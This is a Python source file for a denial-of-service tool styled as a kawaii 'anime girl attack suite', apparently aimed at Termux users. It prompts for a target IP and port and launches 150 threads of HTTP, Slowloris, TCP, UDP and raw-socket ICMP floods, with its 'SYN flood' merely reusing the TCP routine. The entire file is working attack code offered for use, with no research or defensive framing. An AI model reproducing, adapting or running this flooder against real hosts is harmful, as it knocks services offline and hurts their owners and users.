#!/usr/bin/env python3
import os
import sys
import socket
import threading
import random
import time
import requests
from datetime import datetime

# Clear screen
os.system('clear')

stats = {
    'total_packets': 0,
    'total_bytes': 0,
    'active_threads': 0,
    'method': 'None',
    'running': False,
    'target': '',
    'port': 12000,
    'rps': 0,
    'last_packets': 0,
    'last_time': 0
}

methods = {
    '1': 'HTTP FLOOD',
    '2': 'SLOWLORIS',
    '3': 'TCP FLOOD',
    '4': 'UDP FLOOD',
    '5': 'SYN FLOOD',
    '6': 'ICMP FLOOD',
    '7': 'ALL METHODS (HADES MODE)'
}

# Pink colors for terminal
PINK = '\033[95m'
HOTPINK = '\033[91m'
WHITE = '\033[97m'
RESET = '\033[0m'
BOLD = '\033[1m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
CYAN = '\033[96m'

def banner():
    os.system('clear')
    print(f"""{HOTPINK}{BOLD}
╔══════════════════════════════════════════════════════════╗
║     🌸  DDOS ANIME GIRL ATTACK SUITE v3.0  🌸           ║
║     "Kawaii but Deadly ~ Senpai Notice Me!"             ║
╚══════════════════════════════════════════════════════════╝{RESET}
    """)
    print(f"{PINK}     ╱|、{RESET}")
    print(f"{PINK}   (˚ˎ 。7  {RESET}")
    print(f"{PINK}    |、˜〵   {RESET}")
    print(f"{PINK}    じしˍ,)ノ   ~ Senpai ~{RESET}")
    print()

def http_flood():
    urls = [
        f"http://{stats['target']}:{stats['port']}/",
        f"http://{stats['target']}:{stats['port']}/wp-admin",
        f"http://{stats['target']}:{stats['port']}/api",
        f"http://{stats['target']}:{stats['port']}/login"
    ]
    headers = [
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
        {'User-Agent': 'KawaiiBot/1.0', 'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"},
        {'User-Agent': 'AnimeGirl/2.0', 'Accept': 'text/html,application/xhtml+xml'}
    ]
    while stats['running']:
        try:
            url = random.choice(urls)
            header = random.choice(headers)
            requests.get(url, headers=header, timeout=2)
            stats['total_packets'] += 1
            stats['total_bytes'] += 512
        except:
            pass

def slowloris():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((stats['target'], stats['port']))
        sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
        sock.send(f"Host: {stats['target']}\r\n".encode())
        sock.send("User-Agent: Mozilla/5.0\r\n".encode())
        sock.send("Accept-language: en-US,en;q=0.5\r\n".encode())
        
        while stats['running']:
            sock.send(f"X-Random-{random.randint(0, 9999)}: {random.randint(0, 9999)}\r\n".encode())
            stats['total_packets'] += 1
            stats['total_bytes'] += 64
            time.sleep(5)
    except:
        pass

def tcp_flood():
    while stats['running']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((stats['target'], stats['port']))
            payload = random._urandom(1024)
            sock.send(payload * 10)
            stats['total_packets'] += 100
            stats['total_bytes'] += len(payload) * 10
            sock.close()
        except:
            pass

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while stats['running']:
        payload = random._urandom(65500)
        sock.sendto(payload, (stats['target'], stats['port']))
        stats['total_packets'] += 1
        stats['total_bytes'] += 65500

def syn_flood():
    tcp_flood()

def icmp_flood():
    while stats['running']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00' + b'\x00\x00' + b'\x00\x01' + b'\x00\x02' + random._urandom(64)
            sock.sendto(packet, (stats['target'], 0))
            stats['total_packets'] += 1
            stats['total_bytes'] += 64
        except:
            pass

def all_methods():
    methods_list = [http_flood, slowloris, tcp_flood, udp_flood, syn_flood, icmp_flood]
    while stats['running']:
        random.choice(methods_list)()

def start_attack():
    stats['running'] = True
    stats['last_time'] = time.time()
    stats['last_packets'] = 0
    
    method_func = {
        '1': http_flood,
        '2': slowloris,
        '3': tcp_flood,
        '4': udp_flood,
        '5': syn_flood,
        '6': icmp_flood,
        '7': all_methods
    }[stats['method_choice']]
    
    for i in range(150):
        t = threading.Thread(target=method_func)
        t.daemon = True
        t.start()
        stats['active_threads'] = i + 1

def show_stats():
    now = time.time()
    if now - stats['last_time'] >= 1:
        stats['rps'] = stats['total_packets'] - stats['last_packets']
        stats['last_packets'] = stats['total_packets']
        stats['last_time'] = now
    
    print(f"{PINK}╔════════════════════════════════════════════════╗{RESET}")
    print(f"{PINK}║        📊 REAL-TIME STATS                    ║{RESET}")
    print(f"{PINK}╠════════════════════════════════════════════════╣{RESET}")
    print(f"{PINK}║{RESET} 🎯 Target : {CYAN}{stats['target']}:{stats['port']}{RESET}")
    print(f"{PINK}║{RESET} ⚔️ Method : {YELLOW}{stats['method']}{RESET}")
    print(f"{PINK}║{RESET} 💥 Packets: {GREEN}{stats['total_packets']:,}{RESET}")
    print(f"{PINK}║{RESET} 📦 Bytes  : {GREEN}{stats['total_bytes']/1024/1024:.2f} MB{RESET}")
    print(f"{PINK}║{RESET} ⚡ RPS    : {HOTPINK}{stats['rps']}{RESET}")
    print(f"{PINK}║{RESET} 🧵 Threads: {HOTPINK}{stats['active_threads']}{RESET}")
    print(f"{PINK}║{RESET} 🟢 Status : {GREEN if stats['running'] else YELLOW}{'ATTACKING' if stats['running'] else 'IDLE'}{RESET}")
    print(f"{PINK}╚════════════════════════════════════════════════╝{RESET}")

def main():
    banner()
    
    # Input target
    stats['target'] = input(f"{PINK}🌸 Target IP: {RESET}")
    port_input = input(f"{PINK}🎀 Port [{stats['port']}]: {RESET}")
    if port_input:
        stats['port'] = int(port_input)
    
    # Menu method
    print(f"\n{PINK}⚔️ SELECT ATTACK METHOD ⚔️{RESET}")
    for key, method in methods.items():
        print(f"  {CYAN}[{key}]{RESET} {method}")
    
    stats['method_choice'] = input(f"\n{PINK}💬 Pilih method [1-7]: {RESET}")
    while stats['method_choice'] not in methods:
        stats['method_choice'] = input(f"{HOTPINK}❌ Salah! Pilih 1-7: {RESET}")
    
    stats['method'] = methods[stats['method_choice']]
    
    # Start attack
    print(f"\n{GREEN}✅ Memulai serangan ke {stats['target']}:{stats['port']}{RESET}")
    print(f"{HOTPINK}🔥 Press ENTER to stop attack{RESET}\n")
    
    attack_thread = threading.Thread(target=start_attack)
    attack_thread.daemon = True
    attack_thread.start()
    
    # Real-time stats loop
    try:
        while True:
            show_stats()
            time.sleep(0.5)
            # Check for enter key (non-blocking doesn't work well, so we use input with timeout)
            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
                input()
                break
    except KeyboardInterrupt:
        pass
    except:
        # Fallback untuk Termux yang ga support select
        time.sleep(5)
        input(f"\n{PINK}Press ENTER to stop...{RESET}")
    
    stats['running'] = False
    stats['active_threads'] = 0
    print(f"\n{HOTPINK}🛑 Attack stopped!{RESET}")
    print(f"{PINK}🌸 Thanks for using, Senpai~{RESET}")

if __name__ == "__main__":
    import select
    main()
